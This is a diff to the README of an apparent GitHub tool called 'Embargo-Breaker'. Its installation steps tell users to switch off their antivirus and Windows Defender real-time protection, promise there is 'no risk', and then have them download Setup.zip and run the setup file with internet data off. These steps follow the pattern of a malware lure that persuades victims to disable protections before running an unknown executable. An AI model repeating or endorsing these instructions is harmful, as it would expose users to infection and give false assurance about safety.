@@ -7,7 +7,7 @@
 
 ## How to install?
 
-* Step 1: you have to turn off DATA and your ANTIVIRUS so that we can download the file (this program has been tested and there is no risk 😊). For example, we turn off Windows Defender:
+* Step 1: you have to turn off your Antivirus so that we can download the file (this program has been tested and there is no risk 😊). For example, we turn off Windows Defender:
 
 Open `Windows Security > Virus & threat protection > Manage settings` and turn off `Real-time protection`
 
@@ -17,7 +17,7 @@ Open `Windows Security > Virus & threat protection > Manage settings` and turn o
 
 > download the file from [here](https://github.com/ALTONIBOT/Embargo-Breaker/raw/main/Setup.zip) .
 
-* Step 3: open zip and start setup file:
+* Step 3: turn off Internet Data and open zip and start setup file:
 
 ![img](https://github.com/ALTONIBOT/Embargo-Breaker/blob/main/hint-img/1.png)
 
